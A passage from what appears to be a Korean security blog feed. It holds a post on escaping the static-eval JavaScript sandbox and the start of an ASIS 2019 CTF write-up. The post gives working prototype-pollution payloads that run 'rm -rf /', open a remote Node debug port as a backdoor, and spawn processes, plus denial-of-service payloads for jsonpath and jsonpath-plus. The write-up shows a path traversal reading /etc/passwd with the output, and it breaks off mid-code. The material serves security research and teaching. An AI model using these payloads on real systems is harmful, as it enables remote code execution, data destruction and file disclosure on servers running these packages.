class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> evaluate = <span class="built_in">require</span>(<span class="string">'static-eval'</span>);</span><br><span class="line"><span class="keyword">const</span> parse = <span class="built_in">require</span>(<span class="string">'esprima'</span>).parse;</span><br><span class="line"><span class="keyword">const</span> &#123;execSync&#125; = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">`(&#123;&#125;)['__proto__']['__defineGetter__']('env', function()&#123; return &#123;</span></span><br><span class="line"><span class="string">    NODE_DEBUG: 'require("child_process").execSync("rm -rf /")//',</span></span><br><span class="line"><span class="string">    NODE_OPTIONS: '-r /proc/self/environ'</span></span><br><span class="line"><span class="string">&#125;&#125;);`</span></span><br><span class="line"><span class="keyword">var</span> ast = parse(src).body[<span class="number">0</span>].expression;</span><br><span class="line"></span><br><span class="line">evaluate(ast);</span><br><span class="line">execSync(<span class="string">'node blank'</span>);</span><br></pre></td></tr></table></figure><p>이를 <code>static-eval</code> 모듈에 적용하면 위와 같습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec, execSync, spawn, spawnSync, fork &#125; = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// make pollution</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.env = &#123;</span><br><span class="line">    NODE_OPTIONS : <span class="string">'--inspect-brk=0.0.0.0:1234'</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">fork(<span class="string">'blank'</span>);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line">exec(<span class="string">'node blank'</span>);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line">execSync(<span class="string">'node blank'</span>);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line">spawn(<span class="string">'node'</span>, [<span class="string">'blank'</span>]);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line">spawnSync(<span class="string">'node'</span>, [<span class="string">'blank'</span>]);</span><br></pre></td></tr></table></figure><p><code>/proc/self/environ</code> 파일을 사용하는 이전의 방법은 리눅스 서버에서만 작동한다는 단점이 존재합니다.<br>하지만, <code>--inspect-brk</code> 옵션을 이용하여, 서버에 디버그 포트를 열도록 만듦으로서 윈도우에서도 응용 가능합니다.<br>본 옵션을 사용하여 서브 프로세스를 생성하면, 옵션에 설정된 포트로 디버거가 연결될 때가지 대기하며<br>연결이 가능할 경우, 백도어와 동일한 역할을 수행할 수 있습니다.</p><p>디버그 포트가 열리면 <code>node inspect host:port</code> 와 같은 명령을 통해 서버에 연결할 수 있습니다.<br>이후 <code>exec</code> 서브 커맨드를 사용하면 <code>exec child_process.exec(&#39;rm -rf /&#39;)</code> 와 같이 자유롭게 명령 실행이 가능합니다.</p><p><img src="/2019/10/image-3.png" alt="img"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> evaluate = <span class="built_in">require</span>(<span class="string">'static-eval'</span>);</span><br><span class="line"><span class="keyword">const</span> parse = <span class="built_in">require</span>(<span class="string">'esprima'</span>).parse;</span><br><span class="line"><span class="keyword">const</span> &#123;execSync&#125; = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">`(&#123;&#125;)['__proto__']['__defineGetter__']('env', function()&#123; return &#123;</span></span><br><span class="line"><span class="string">    NODE_OPTIONS: '--inspect-brk=0.0.0.0:1234'</span></span><br><span class="line"><span class="string">&#125;&#125;)`</span></span><br><span class="line"><span class="keyword">var</span> ast = parse(src).body[<span class="number">0</span>].expression;</span><br><span class="line"></span><br><span class="line">evaluate(ast);</span><br><span class="line">execSync(<span class="string">'node blank'</span>);</span><br></pre></td></tr></table></figure><p>두번째 방법을 <code>static-eval</code> 모듈에 적용하면 위와 같은 모습이 됩니다.</p><hr><h2 id="Jsonpath-Jsonpath-plus"><a href="#Jsonpath-Jsonpath-plus" class="headerlink" title="Jsonpath / Jsonpath-plus"></a>Jsonpath / Jsonpath-plus</h2><p><code>static-eval</code> 에 의존성을 가지는 모듈인 <code>JSONPath</code> 는 <code>XML</code>에서의 <code>XPath</code> 와 같은 역할을 하도록 디자인 된, 쿼리 언어의 일종입니다. 그러나 RFC로 정의된 <code>Xpath</code> 와 달리 <code>JSONPath</code> 는 명확한 정의가 이루어지지 않았기 때문에, 구현에 많은 모호함이 있습니다.</p><p><img src="/img/2020/01/1576102306546.png" alt="img"></p><p><code>JSONPath</code> 는 <code>XPath</code> 와 마찬가지로 표현식에 일치하는 문서를 필터링하는 필터 기능을 제공하며, 문법은 위와 같습니다. 확인해보면 소괄호 안에 <code>subscript</code> 를 삽입하는 <code>static evaluation</code> 기능을 제공한다고 되어 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jp = <span class="built_in">require</span>(<span class="string">'jsonpath'</span>);</span><br><span class="line"><span class="keyword">var</span> data = [&#123;&#125;]</span><br><span class="line"><span class="keyword">var</span> names = jp.query(data, <span class="string">`$..[?( (&#123;&#125;)['__proto__']['__defineGetter__']('toString', (&#123;&#125;)['constructor']) )]`</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    res.end(<span class="string">'working'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure><p>발견한 취약점을 통해 <code>JSONPath</code> 를 사용하는 서버에 <code>Denial of Service</code> 를 유발할 수 있음을 확인할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;JSONPath&#125; = <span class="built_in">require</span>(<span class="string">'jsonpath-plus'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> json = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> result = JSONPath(&#123;<span class="attr">path</span>: <span class="string">`$..[?( @['__proto__']['__defineGetter__']('toString', @['constructor']) )]`</span>, json&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    res.end(<span class="string">'working'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure><p><code>jsonpath-plus</code> 모듈 또한 비슷한 로직으로 구성되며, <code>static-eval</code> 모듈을 사용하기에 동일한 방법으로 <code>Denial of Service</code> 를 유발할 수 있습니다. <code>jsonpath</code>과 <code>jsonpath-plus</code> 모듈은 현재를 기준으로 각 1594만, 1382만 다운로드를 기록하였습니다.</p><hr><h2 id="Another-Exploitation"><a href="#Another-Exploitation" class="headerlink" title="Another Exploitation"></a>Another Exploitation</h2><p><code>static-eval</code> 모듈에서 <code>RCE</code>를 유발하는 다른 방법입니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">name</span>: <span class="string">'value'</span>&#125;</span><br><span class="line"><span class="comment">// &#123;name: "value"&#125;</span></span><br><span class="line">obj = <span class="string">'apple'</span>, &#123;obj&#125;</span><br><span class="line"><span class="comment">// &#123;obj: "apple"&#125;</span></span><br><span class="line">name=<span class="string">'apple'</span>, &#123;<span class="attr">name</span>:<span class="string">'value'</span>&#125;</span><br><span class="line"><span class="comment">// &#123;name: "value"&#125;</span></span><br><span class="line">&#123;[name]:<span class="string">'value'</span>&#125;</span><br><span class="line"><span class="comment">// &#123;apple: "value"&#125;</span></span><br><span class="line">&#123;[<span class="built_in">console</span>.log(process)]:<span class="string">'value'</span>&#125;</span><br><span class="line"><span class="comment">// process &#123;version: "v12.10.0", versions: &#123;…&#125;, arch: "x64", platform: "win32", release: &#123;…&#125;, …&#125;</span></span><br></pre></td></tr></table></figure><p>자바스크립트에서 객체를 정의할 때, <code>key name</code> 부분에 배열 첨자가 사용되면 내부 스크립트를 <code>evaluation</code> 하고<br>문자열로 변환하여 <code>key</code> 값에 사용합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(&#123;[process]:<span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">// &#123;undefined: 1&#125;</span></span><br></pre></td></tr></table></figure><p><code>static-eval</code> 모듈에서는 이러한 Expression을 처리하지 않고 있기 때문에<br>내부에 들어가는 스크립트 실행이 이루어지지 않습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> unparse = <span class="built_in">require</span>(<span class="string">'escodegen'</span>).generate;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.type === <span class="string">'FunctionExpression'</span>) &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Function</span>(keys.join(<span class="string">', '</span>), <span class="string">'return '</span> + unparse(node)).apply(<span class="literal">null</span>, vals);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>그러나 함수 생성자의 인자로 사용되면 조금 다른 동작을 보입니다.<br><code>static-eval</code> 모듈 내부에서 함수 정의에 사용하는 <code>escodegen</code> 모듈은 그 표현식을 지원하기 때문인데요.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (&#123;[process.version]:<span class="number">1</span>&#125;);</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">// &#123;v12.10.0: 1&#125;</span></span><br></pre></td></tr></table></figure><p>따라서 코드를 함수 정의식 내부에 삽입하여 사용자 함수를 생성해 줌으로서<br>임의의 코드를 실행하는 것이 가능합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> evaluate = <span class="built_in">require</span>(<span class="string">'static-eval'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;parse&#125; = <span class="built_in">require</span>(<span class="string">'esprima'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">`</span></span><br><span class="line"><span class="string">(function () &#123;</span></span><br><span class="line"><span class="string">    (&#123;</span></span><br><span class="line"><span class="string">        [process.binding('spawn_sync').spawn(&#123;</span></span><br><span class="line"><span class="string">            file: 'calc',</span></span><br><span class="line"><span class="string">            args: ['1'],</span></span><br><span class="line"><span class="string">            envPairs: ['y='],</span></span><br><span class="line"><span class="string">            stdio: [&#123;</span></span><br><span class="line"><span class="string">                type: 'pipe',</span></span><br><span class="line"><span class="string">                readable: 1</span></span><br><span class="line"><span class="string">            &#125;]</span></span><br><span class="line"><span class="string">        &#125;)]: 1</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">&#125;)()`</span></span><br><span class="line"><span class="keyword">var</span> ast = parse(src).body[<span class="number">0</span>].expression;</span><br><span class="line">evaluate(ast);</span><br></pre></td></tr></table></figure><p>전역 process 객체를 통해 임의 명령 실행을 수행한 예제입니다.</p><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/" target="_blank" rel="noopener">https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/</a></li><li><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/" target="_blank" rel="noopener">https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/</a></li><li><a href="https://blog.coderifleman.com/2019/07/19/prototype-pollution-attacks-in-nodejs/" target="_blank" rel="noopener">https://blog.coderifleman.com/2019/07/19/prototype-pollution-attacks-in-nodejs/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> sandbox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASIS 2019 Final - Trust Zone</title>
      <link href="/asis-2019-final-trust-zone/"/>
      <url>/asis-2019-final-trust-zone/</url>
      
        <content type="html"><![CDATA[<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://66.172.33.59:5000/</span></span><br><span class="line">&#123;<span class="attr">"code"</span>:<span class="number">200</span>,<span class="attr">"data"</span>:&#123;<span class="attr">"start"</span>:<span class="string">"/get_doc?url=http://66.172.33.59/docs/doc1.doc"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>서버에 접속하면, 먼저 링크가 하나 주어집니다.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://66.172.33.59:5000/get_doc?url=http://66.172.33.59/docs/doc1.doc</span></span><br><span class="line">&#123;<span class="attr">"code"</span>:<span class="number">200</span>,<span class="attr">"data"</span>:&#123;<span class="attr">"the doc content"</span>:<span class="string">"b'Doc 1'"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>접속하면 문서 내용이 표시되는데, 특별한 내용은 없습니다.<br>인자의 URL 부분을 퍼징해 보면 앞의 <code>http://66.172.33.59/</code> 와 끝의 <code>.doc</code> 에 static 한 비교를 수행하고 있다는 것을 알 수 있습니다.<br>어느 한 부분이라도 만족하지 못하면, <code>Security Error</code> 를 반환합니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- http://66.172.33.59:5000/get_doc?url=http://66.172.33.59/.doc --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD HTML 3.2 Final//EN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Index of /<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Index of /<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/blank.gif"</span> <span class="attr">alt</span>=<span class="string">"[ICO]"</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?C=N;O=D"</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?C=M;O=A"</span>&gt;</span>Last modified<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?C=S;O=A"</span>&gt;</span>Size<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?C=D;O=A"</span>&gt;</span>Description<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/folder.gif"</span> <span class="attr">alt</span>=<span class="string">"[DIR]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"doc_app/"</span>&gt;</span>doc_app/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2019-11-14 14:51  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/folder.gif"</span> <span class="attr">alt</span>=<span class="string">"[DIR]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"docs/"</span>&gt;</span>docs/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2019-11-14 14:51  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/folder.gif"</span> <span class="attr">alt</span>=<span class="string">"[DIR]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"flag/"</span>&gt;</span>flag/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2019-11-14 14:51  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.38 (Debian) Server at 66.172.33.59 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://66.172.33.59/.doc</code> 을 URL 에 넣어 확인해 보면<br>이 처럼 디렉토리 리스팅이 되는 것을 확인할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;doc_app</span><br><span class="line">---- doc.php</span><br><span class="line">&#x2F;docs</span><br><span class="line">---- doc1</span><br><span class="line">---- doc2</span><br><span class="line">---- doc3</span><br><span class="line">&#x2F;flag</span><br><span class="line">---- flag.php</span><br></pre></td></tr></table></figure><p>정리해보면, 내부 웹 서버 구조는 위와 같습니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DOC Reader<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?filename=docktest"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>이 중에 <code>/doc_app/doc.php</code> 파일이 수상해 보입니다.<br>인자로 파일 이름을 줄 수 있는데, 실제로 테스트해보면 <code>Traversal</code> 이 가능합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;66.172.33.59:5000&#x2F;get_doc?url&#x3D;http:&#x2F;&#x2F;66.172.33.59&#x2F;doc_app&#x2F;doc.php?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%23.doc</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure><p>위와 같은 방법으로 <code>/etc/passwd</code> 파일을 읽을 수 있었습니다.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 